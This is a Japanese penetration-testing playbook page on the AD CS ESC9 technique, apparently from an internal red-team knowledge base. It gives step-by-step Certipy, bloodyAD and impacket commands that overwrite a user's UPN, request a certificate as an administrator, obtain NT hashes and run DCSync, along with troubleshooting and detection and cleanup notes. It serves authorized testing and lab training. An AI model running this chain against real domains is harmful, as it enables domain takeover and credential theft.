# ESC9 — No Security Extension（szOID_NTDS_CA_SECURITY_EXT 欠如）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（発行した証明書はパスワード変更後も有効）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768・MDI アラート）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [x] 不可逆な設定変更を含む（対象ユーザーの UPN を一時的に書き換えるため、書き換え中にロック・混乱が起きるリスクあり）
>
> 実施可否は事前合意で明示確認すること。取得した証明書はテスト完了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに実施する：

- `certipy find` の出力で対象テンプレートに `[!] Vulnerabilities: ESC9` が表示されている
- または以下の条件がすべて手動で確認できる：
  - テンプレートの `msPKI-Enrollment-Flag` に `CT_FLAG_NO_SECURITY_EXTENSION`（値 `0x00080000`）が設定されている
  - テンプレートの `Client Authentication: True`（EKU に Client Authentication が含まれる）
  - 攻撃者が**任意のドメインユーザーアカウントに対して `GenericWrite` または `WriteProperty(userPrincipalName)` 権限**を持つ
  - その対象ユーザーアカウントがテンプレートへの Enrollment 権限を持つ

**攻撃者の思考トレース：** 通常の証明書には `szOID_NTDS_CA_SECURITY_EXT` 拡張が埋め込まれ、証明書と AD アカウントの `objectSid` が紐づく。これがあると発行先アカウントしか認証に使えない。このフラグが設定されたテンプレートではその拡張が入らないため、証明書の UPN フィールドだけで認証アカウントが決まる。したがって、発行申請前に被制御ユーザーの UPN を標的の UPN に書き換えれば、標的として証明書を取得できる。

> **注意（ESC9 は情報が比較的少ない）：** `CT_FLAG_NO_SECURITY_EXTENSION` は CVE-2022-26923 の修正（2022年5月パッチ）以降の新しい検出クラスであり、実環境での確認事例がまだ限られる。条件の特定には `msPKI-Enrollment-Flag` の生の値確認が必要になる場合がある。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**:
  - Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
  - bloodyAD または PowerShell AD モジュール（UPN 書き換え用）
- **必要な権限**:
  - Enrollment 対象ユーザーに対する `GenericWrite` または `WriteProperty(userPrincipalName)`
  - 対象テンプレートへの Enrollment 権限を持つユーザーアカウント（上の `GenericWrite` 先と同一でもよい）
- **オフライン代替**: Certipy 非使用環境では `certreq` + 手動 CSR（Windows 端末要）。UPN 書き換えは PowerShell `Set-ADUser -UserPrincipalName` で代替

---

## 観点・着眼点

### 先に確認すること

1. `certipy find -vulnerable -stdout` で ESC9 が表示されているか確認する
2. 表示されない場合は `msPKI-Enrollment-Flag` の RAW 値を確認する：

```bash
# [Attacker] LDAP で msPKI-Enrollment-Flag の値を取得
ldapsearch \
  -H ldap://[DC_IP] \
  -x -D "[USER]@[DOMAIN]" \
  -w "[PASSWORD]" \
  -b "CN=[TEMPLATE_NAME],CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[DOMAIN_PART],DC=[DOMAIN_PART]" \
  "(objectClass=pKICertificateTemplate)" msPKI-Enrollment-Flag
```

出力例（`CT_FLAG_NO_SECURITY_EXTENSION` が含まれる場合）：

```
msPKI-Enrollment-Flag: 524288
# 524288 = 0x80000 = CT_FLAG_NO_SECURITY_EXTENSION が含まれることを示す
# ビットマスク確認: 524288 & 524288 != 0
```

3. BloodHound で対象ユーザーへの `GenericWrite` / `WriteProperty` エッジを確認する

### 何が出たら次に何をするか

| シグナル | 判断 |
|---------|------|
| `ESC9` が `[!] Vulnerabilities` に表示 | Step 1（UPN 書き換え）へ進む |
| テンプレートの `Enrollment Rights` に制御できるユーザーが含まれない | 登録権限を持つ他の制御可能アカウントを BloodHound で探す |
| 制御対象ユーザーが `Protected Users` グループに所属 | `Protected Users` は一部 Kerberos 機能を制限する。PKINIT を使わず NT ハッシュ経由の横展開を別途検討する |
| `StrongCertificateBindingEnforcement` が 2（完全強制）に設定されている | ESC9 の攻撃経路は封じられている。ESC10 との違いを確認し、KDC 設定を再検証する |

---

## 手順

事前準備（必須）：時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### Step 1: 制御可能ユーザーの UPN を標的の UPN に書き換える

```bash
# [Attacker] bloodyAD で UPN を書き換える（Linux テスター端末から）
bloodyAD \
  --host [DC_IP] \
  -d [DOMAIN] \
  -u [ATTACKER_USER] \
  -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[TARGET_UPN]"
# 例: TARGET_UPN = administrator@example.local
```

PowerShell 代替（Windows 端末または WinRM セッションから）：

```powershell
# [Attacker] PowerShell で UPN を書き換える
Set-ADUser -Identity [CONTROLLED_USER] -UserPrincipalName "[TARGET_UPN]"
```

### Step 2: 書き換えた UPN で証明書を申請する

```bash
# [Attacker] CONTROLLED_USER の認証情報で証明書を申請（UPN は TARGET_UPN に書き換え済み）
certipy req \
  -ca [CA_NAME] \
  -template [TEMPLATE_NAME] \
  -u [CONTROLLED_USER]@[DOMAIN] \
  -p "[CONTROLLED_USER_PASSWORD]" \
  -dc-ip [DC_IP]
# → 発行された証明書の SAN には TARGET_UPN が入る
# → [CONTROLLED_USER].pfx が生成される
```

### Step 3: UPN を元に戻す（原状回復）

```bash
# [Attacker] UPN を元の値に戻す（すぐ実施すること）
bloodyAD \
  --host [DC_IP] \
  -d [DOMAIN] \
  -u [ATTACKER_USER] \
  -p "[ATTACKER_PASSWORD]" \
  set attribute [CONTROLLED_USER] userPrincipalName "[ORIGINAL_UPN]"
```

### Step 4: 取得した証明書で PKINIT 認証 → NT ハッシュ取得

```bash
# [Attacker] 証明書で認証（TARGET_UPN として）
certipy auth \
  -pfx [CONTROLLED_USER].pfx \
  -domain [DOMAIN] \
  -username [TARGET_USERNAME] \
  -dc-ip [DC_IP]
# → NT ハッシュと TGT が出力される
```

### Step 5: NT ハッシュで DCSync（DA ハッシュを取得した場合）

```bash
# [Attacker] DCSync
impacket-secretsdump \
  -just-dc-ntlm \
  -no-pass \
  -hashes :[NT_HASH] \
  [DOMAIN]/[TARGET_USERNAME]@[DC_IP]
```

### 原状回復：証明書の失効

```bash
# [Attacker] 発行した証明書を CA で失効（REQUEST_ID は Step 2 の出力で確認）
certipy ca \
  -ca [CA_NAME] \
  -u [USER]@[DOMAIN] \
  -p "[PASSWORD]" \
  -dc-ip [DC_IP] \
  -revoke [REQUEST_ID]
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `certipy req` が `KDC_ERR_PADATA_TYPE_NOSUPP` を返す | DC が PKINIT 非サポート（古い OS）。または `StrongCertificateBindingEnforcement=2` で SID なし証明書を拒否。ESC10 の条件も同時確認する |
| `certipy auth` が `KDC_ERR_CLIENT_NOT_TRUSTED` | CA が NTAuthCertificates に登録されていない。`certutil -viewstore ldap:///CN=NTAuthCertificates,...` で確認 |
| UPN 書き換えに `ACCESS_DENIED` | `GenericWrite` エッジが実際には `WriteProperty` で特定属性のみ対象の可能性。BloodHound の「Outbound Object Control」で再確認 |
| UPN 書き換え後すぐに元に戻っても cert が `CONTROLLED_USER` にバインドされる | `StrongCertificateBindingEnforcement` が有効で SID バインドが必要。ESC9 は不成立、ESC10 を確認する |
| テンプレートが見当たらない | `certipy find` に `-enabled` オプションを追加して有効テンプレートのみ表示。無効テンプレートへの申請は拒否される |

---

## 注意点・落とし穴

- **UPN 書き換え中は対象ユーザーのログインに影響が出る可能性がある**：書き換え〜元に戻すまでの間、対象ユーザーの Kerberos 認証が乱れる場合がある。本番では時間帯の調整が必要
- **ESC9 は ESC10 と密接に関連する**：ESC9 は「証明書に SID が入らない」ことを悪用し、ESC10 は「KDC が SID なし証明書をどう扱うか」を悪用する。パッチ状態によって実際に刺さる経路が変わる
- **`Protected Users` グループへの証明書認証は制限される**：対象が `Protected Users` の場合 PKINIT が動かない場合がある
- **`-pfx` ファイルの UPN と `-username` の不一致**：`certipy auth` の `-username` には pfx 内の UPN から取ったユーザー名を指定する

> 原理 → `../../06_Concepts/AD_CS_Certificate_Mapping.md`（ESC9 / ESC10 共通原理として作成推奨）

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。他ユーザーの属性を一時改ざんするため影響範囲が広い
- **想定されるSIEM/EDR検知**: Event ID 4738（ユーザーアカウント変更：UPN 書き換え）/ 4886・4887（証明書要求・発行）/ 4768（TGT 要求）/ MDI「ユーザー属性の異常な変更」アラート
- **業務影響リスク**: UPN 書き換え中に対象ユーザーが認証を試みると失敗する可能性あり。短時間での実施を徹底する
- **原状回復必須項目**: ✅ 書き換えた UPN を元の値に戻す / ✅ 発行した証明書を CA で失効 / ✅ 取得した NT ハッシュ・TGT・pfx ファイルの暗号化保管・テスト完了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 前：GenericWrite によるユーザー属性書き換え → `../ACE_Abuse/GenericWrite.md`
- 後：ESC10（KDC 側のマッピング設定の確認）→ `./ESC10.md`
- 後：証明書取得後の DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
